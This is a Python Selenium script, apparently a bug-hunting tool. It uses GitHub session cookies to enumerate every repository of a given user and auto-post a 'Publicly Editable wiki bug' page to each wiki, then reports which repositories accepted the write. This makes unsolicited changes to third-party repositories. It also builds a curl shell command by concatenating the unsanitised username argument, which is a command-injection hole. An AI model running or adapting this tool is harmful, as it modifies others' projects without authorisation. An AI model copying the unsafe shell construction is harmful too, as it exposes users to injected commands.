import os
import sys
import re
import subprocess
from selenium import webdriver
import time 
import requests


url = "https://github.com/Shashank-In/VulEdiWi/wiki/_new"
driver = webdriver.Firefox()
driver.get(url) #Need to call the url uselessly because selenium won't add cookies.


#Add your cookies here

c1 = {'name' : 'octo' , 'value' : 'GH1.1.964598663.1536329514'}
c2 = {'name' : '_ga' , 'value' : 'GA1.2.1232625736.1536329516'}
c3 = {'name' : 'user_session' , 'value': 'ENTER_THE_VALUE'}
c4 = {'name' : '__Host-user_session_same_site' , 'value' : 'ENTER_THE_VALUE'}
c5 = {'name' : 'logged_in' , 'value':'yes'}
c6 = {'name' : 'dotcom_user', 'value':'ENTER_THE_VALUE'}
c7 = {'name' : 'tz' , 'value': 'Asia/Calcutta'}
c8 = {'name' : 'has_recent_activity' , 'value': '1'}
c9 = {'name' : '_gat' , 'value': '1'}
c10 = {'name' : '_gh_sess' , 'value' : 'ENTER_THE_VALUE'}


driver.add_cookie(c1)
driver.add_cookie(c2)
driver.add_cookie(c3)
driver.add_cookie(c4)
driver.add_cookie(c5)
driver.add_cookie(c6)
driver.add_cookie(c7)
driver.add_cookie(c8)
driver.add_cookie(c9)
driver.add_cookie(c10)


#Add username as an input to the script
enter = sys.argv[1];


#Fetching all the repos from the supplied Github username

urld = "https://api.github.com/users/" + enter + "/repos?per_page=1000"
reg = r'https\:\/\/github\.com\/.*\.git'
reg2 = r'^[https].*[\.git]$'


data = os.popen('curl -s "https://api.github.com/users/'+enter+'/repos?per_page=100&page=1"  | grep -o '+"'https://github.com[^\"]*\.git'").read()
test =  data.split("\n")



gits = []

for i in test:
	test2 = i.replace(".git" , "")
	if(test2 != ""):
		gits.append(test2)

wikis = []
for i in gits:
	wiki = str(i + "/wiki/_new")
	wikis.append(wiki)



for j in wikis:
	driver.get(j)
	time.sleep(5)
	try:
		title = driver.find_element_by_name("wiki[name]")
		title.clear()
		title.send_keys("Publicly Editable wiki bug")		
	except:
		pass

	
	try:
		body = driver.find_element_by_name("wiki[body]")
		body.clear()
		body.send_keys("The repo has publicly enabled wiki ~ Shashank https://twitter.com/cyberboyIndia ")
		time.sleep(3)
		driver.find_element_by_id('gollum-editor-submit').click()
	except:
		pass

#Checking for vulnerable repos

for k in gits:
	url = k + "/wiki/Publicly-Editable-wiki-bug" 
	r = requests.get(url, allow_redirects=False)
	print(r.status_code)
	if((r.status_code) == 302):
		print('not vulnerable')
	else:
		print(url)
	#time.sleep(10)
driver.quit()
